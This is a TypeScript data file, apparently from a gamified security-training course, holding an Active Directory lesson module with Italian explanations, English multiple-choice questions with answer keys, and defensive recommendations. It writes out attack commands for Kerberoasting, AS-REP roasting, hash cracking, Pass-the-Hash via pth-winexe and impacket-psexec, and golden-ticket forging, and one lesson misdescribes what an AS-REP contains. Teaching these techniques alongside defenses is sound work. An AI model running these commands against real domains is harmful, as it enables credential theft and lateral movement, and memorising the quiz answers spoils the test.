              { id: 'kd_3', text: 'Lightweight Directory Access (LDAP) and Server Message Block (SMB)', isCorrect: false },
              { id: 'kd_4', text: 'Remote Desktop Protocol (RDP) and Windows Remote Management (WinRM)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 4120: Kerberos Network Authentication Service',
              whyItWorks: 'The AS verifies client identity and issues the TGT; the TGS issues service-specific tickets.',
              patchRecommendation: 'Protect Domain Controllers with strict Tier 0 administrative separation.',
              terminalProof: '$ klist\nTicket Granting Service: krbtgt/CORP.LOCAL'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_ad_2',
        title: 'Service Principal Names (SPN) & TGS Tickets',
        subtitle: 'Associating network services (MSSQL, HTTP) with AD service accounts',
        moduleId: 'mod_active_directory',
        status: 'available',
        domain: 'Defense & SOC',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Service Principal Names (SPN) e Richieste TGS',
          keyTakeaway: 'Uno SPN associa un servizio a un account utente. Qualsiasi utente autenticato nel dominio può richiedere un ticket TGS per qualsiasi account con SPN.',
          syntaxExample: '$ setspn -T corp.local -Q */*\nMSSQLSvc/db01.corp.local:1433 -> corp\\svc_sql',
          operationalContext: 'Poiché il ticket TGS è cifrato con l\'hash NTLM della password dell\'account di servizio, può essere estratto e craccato offline.'
        },
        questions: [
          {
            id: 'q_ad_spn',
            title: 'Query Registered SPNs in Domain',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Intermediate',
            prompt: 'Which native Windows utility queries all registered Service Principal Names (SPNs) across the Active Directory forest?',
            options: [
              { id: 'sp_1', text: 'setspn -T domain.local -Q */*', isCorrect: true },
              { id: 'sp_2', text: 'net localgroup Administrators', isCorrect: false },
              { id: 'sp_3', text: 'ipconfig /displaydns --spn', isCorrect: false },
              { id: 'sp_4', text: 'sc query type= service-spn', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Active Directory Enumeration: Service Principal Names',
              whyItWorks: 'setspn queries LDAP attributes (servicePrincipalName) without generating security alarms.',
              patchRecommendation: 'Audit SPNs regularly and migrate service accounts to Group Managed Service Accounts (gMSA).',
              terminalProof: 'CN=svc_sql,OU=ServiceAccounts,DC=corp,DC=local\nservicePrincipalName: MSSQLSvc/sql01:1433'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_ad_3',
        title: 'Kerberoasting & Offline Hashcat Cracking',
        subtitle: 'Requesting TGS tickets and brute-forcing passwords with Hashcat mode 13100',
        moduleId: 'mod_active_directory',
        status: 'available',
        domain: 'Defense & SOC',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Attacco Kerberoasting e Cracking Offline',
          keyTakeaway: 'Kerberoasting estrae il ticket TGS di un account di servizio e ne effettua il brute-force offline con Hashcat (modulo 13100). Non genera tentativi falliti sul Domain Controller.',
          syntaxExample: '$ GetUserSPNs.py corp.local/operator:Password123 -request -outputfile tgs.hash\n$ hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt',
          operationalContext: 'Nessun account lockout viene innescato perché il cracking avviene interamente sulla GPU locale dell\'attaccante.'
        },
        questions: [
          {
            id: 'q_ad_kerberoast_concept',
            title: 'Why Kerberoasting Avoids Account Lockout',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Hardcore',
            prompt: 'Why does an attacker performing Kerberoasting never trigger Active Directory Account Lockout thresholds?',
            options: [
              { id: 'kb_1', text: 'Ticket is cracked offline on local GPU without sending login attempts to Domain Controller', isCorrect: true },
              { id: 'kb_2', text: 'Domain Controllers disable lockout policies for all accounts with registered SPNs', isCorrect: false },
              { id: 'kb_3', text: 'Kerberos authentication packets bypass network firewalls using UDP port 88', isCorrect: false },
              { id: 'kb_4', text: 'The TGS ticket payload is transmitted in plaintext without cryptographic encryption', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'MITRE ATT&CK T1558.003: Kerberoasting Attack Vector',
              whyItWorks: 'The KDC willingly issues the encrypted TGS ticket; cracking occurs entirely offline.',
              patchRecommendation: 'Use Group Managed Service Accounts (gMSA) with 128-character automatically rotated passwords.',
              terminalProof: '$ hashcat -m 13100 tgs.hash rockyou.txt\nCracked: svc_sql:Summer2024!'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_ad_4',
        title: 'AS-REP Roasting & DONT_REQ_PREAUTH',
        subtitle: 'Exploiting accounts that do not require Kerberos preauthentication',
        moduleId: 'mod_active_directory',
        status: 'available',
        domain: 'Defense & SOC',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'AS-REP Roasting: Account Senza Pre-Autenticazione',
          keyTakeaway: 'Se l\'attributo DONT_REQ_PREAUTH è attivo su un utente, chiunque può richiedere un ticket AS-REP al Domain Controller senza fornire credenziali. L\'AS-REP contiene l\'hash NTLM della password.',
          syntaxExample: '$ GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash\n$ hashcat -m 18200 asrep.hash rockyou.txt',
          operationalContext: 'La pre-autenticazione Kerberos deve essere SEMPRE obbligatoria per tutti gli account di dominio.'
        },
        questions: [
          {
            id: 'q_ad_asrep',
            title: 'Identify Vulnerable Account Setting for AS-REP Roasting',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Intermediate',
            prompt: 'Which Active Directory account flag allows attackers to retrieve Kerberos AS-REP hashes without knowing the password?',
            options: [
              { id: 'ar_1', text: 'Do not require Kerberos preauthentication (DONT_REQ_PREAUTH)', isCorrect: true },
              { id: 'ar_2', text: 'Password never expires (DONT_EXPIRE_PASSWORD)', isCorrect: false },
              { id: 'ar_3', text: 'Account is trusted for delegation (TRUSTED_FOR_DELEGATION)', isCorrect: false },
              { id: 'ar_4', text: 'Smartcard is required for interactive logon (SMARTCARD_REQUIRED)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'MITRE ATT&CK T1558.004: AS-REP Roasting',
              whyItWorks: 'Without preauthentication, the KDC immediately responds with an encrypted timestamp hash.',
              patchRecommendation: 'Audit all user accounts with PowerShell and ensure DONT_REQ_PREAUTH is cleared.',
              terminalProof: '$ Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}\nUser: backup_operator'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_ad_5',
        title: 'Pass-The-Hash & Memory LSASS Extraction',
        subtitle: 'Extracting NTLM hashes from memory and lateral movement over SMB/RPC',
        moduleId: 'mod_active_directory',
        status: 'available',
        domain: 'Defense & SOC',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Pass-The-Hash ed Estrazione LSASS',
          keyTakeaway: 'Il protocollo NTLM autentica gli utenti verificando l\'hash della password, non la password in chiaro. Con Pass-The-Hash l\'attaccante usa direttamente l\'hash NTLM per autenticarsi su altre macchine.',
          syntaxExample: '$ pth-winexe -U corp/admin%aad3b435...:b4b9b02e6f09a9bd86c022ac00a7edb4 //10.0.0.5 cmd.exe',
          operationalContext: 'Windows Defender Credential Guard isola LSASS in un processo virtualizzato VBS, impedendo il dump degli hash di memoria.'
        },
        questions: [
          {
            id: 'q_ad_pth',
            title: 'Mechanism of Pass-The-Hash Attack',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Intermediate',
            prompt: 'Why does Pass-The-Hash (PtH) succeed in authenticating against Windows hosts without knowing the plaintext password?',
            options: [
              { id: 'pt_1', text: 'NTLM authentication challenge-response protocol uses the password hash as the authenticating secret', isCorrect: true },
              { id: 'pt_2', text: 'Windows Domain Controllers convert all incoming hashes into plaintext before verification', isCorrect: false },
              { id: 'pt_3', text: 'SMB signing automatically decrypts all hashes transmitted over port 445', isCorrect: false },
              { id: 'pt_4', text: 'Kerberos tickets are generated without cryptographic integrity checksums', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'MITRE ATT&CK T1550.002: Pass the Hash',
              whyItWorks: 'The NTLM response is computed using the NTLM hash; knowledge of the plaintext password is mathematically unnecessary.',
              patchRecommendation: 'Enable Windows Defender Credential Guard and restrict NTLM authentication across the domain.',
              terminalProof: '$ impacket-psexec -hashes :b4b9b02... admin@10.0.0.5\nC:\\Windows\\system32#'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_ad_6',
        title: 'Final Test: Active Directory Security Audit',
        subtitle: 'Comprehensive evaluation on Kerberos attacks, lateral movement, tiering models and forest defense',
        moduleId: 'mod_active_directory',
        status: 'available',
        domain: 'Defense & SOC',
        xpReward: 120,
        eloReward: 35,
        isFinalTest: true,
        lessonExplanation: {
          conceptTitle: 'Esame Finale della Missione Active Directory',
          keyTakeaway: 'Valutazione pratica sulla catena completa di attacco e difesa: Kerberoasting, AS-REP Roasting, Pass-The-Hash e Tiered Administration.',
          syntaxExample: '$ bloodhound-python -d corp.local -u operator -p Password123 -c All',
          operationalContext: 'Questo esame finale convalida le competenze di Red Teaming e difesa enterprise richieste per ruoli senior di Cyber Security.'
        },
        questions: [
          {
            id: 'q_ad_exam_1',
            title: 'Golden Ticket vs Silver Ticket',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Hardcore',
            prompt: 'What distinguishes a Kerberos Golden Ticket from a Silver Ticket in an Active Directory compromise?',
            options: [
              { id: 'ax_1', text: 'Golden Ticket is forged with krbtgt hash (full domain compromise); Silver Ticket targets a specific service', isCorrect: true },
              { id: 'ax_2', text: 'Silver Ticket grants Enterprise Admin rights; Golden Ticket grants local administrator only', isCorrect: false },
              { id: 'ax_3', text: 'Golden Ticket expires after 10 hours; Silver Ticket persists perpetually across reboots', isCorrect: false },
              { id: 'ax_4', text: 'Silver Ticket requires domain controller reboot; Golden Ticket operates in memory only', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'MITRE ATT&CK T1558.001 / T1558.002: Golden & Silver Tickets',
              whyItWorks: 'krbtgt encrypts all TGTs; compromising it allows creating forged TGTs for any user with any group membership.',
              patchRecommendation: 'Reset the krbtgt account password twice with a 24-hour interval following an incident.',
              terminalProof: 'TicketEngine: kerberos::forge_golden_ticket /user:Administrator /domain:corp.local /sid:S-1-5-21... /krbtgt:...'
            },
            xpReward: 60,
            eloReward: 17
          },
          {
            id: 'q_ad_exam_2',
            title: 'Enterprise Tiering Model Defense Architecture',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Hardcore',
            prompt: 'Under Microsoft Enterprise Access Model (Tiering), which rule prevents credential harvesting across boundaries?',
            options: [
              { id: 'ax_tier1', text: 'Tier 0 admin credentials (Domain Admins) must NEVER log into Tier 1 (Servers) or Tier 2 (Workstations)', isCorrect: true },
              { id: 'ax_tier2', text: 'Workstation users must log into Domain Controllers daily to refresh Kerberos session tokens', isCorrect: false },
              { id: 'ax_tier3', text: 'All domain servers must share the exact same local administrator password across the forest', isCorrect: false },
              { id: 'ax_tier4', text: 'Domain Admin passwords must be stored in plaintext within Active Directory group policies', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Enterprise Identity Architecture: Microsoft Tiering Model',
              whyItWorks: 'Logging into a compromised workstation leaves Tier 0 credentials in LSASS memory, allowing lateral escalation.',
              patchRecommendation: 'Deploy Privileged Access Workstations (PAWs) and enforce Restricted Admin mode for RDP.',
              terminalProof: 'Group Policy: Deny log on as a batch job / Deny log on through Remote Desktop Services'
            },
            xpReward: 60,
            eloReward: 18
          }
        ]
      }
    ]
  }
];

export const SKILL_MODULES_EN: SkillModule[] = SKILL_MODULES;

export function getSkillModules(lang: Language = getSavedLanguage()): SkillModule[] {
  return SKILL_MODULES;
}
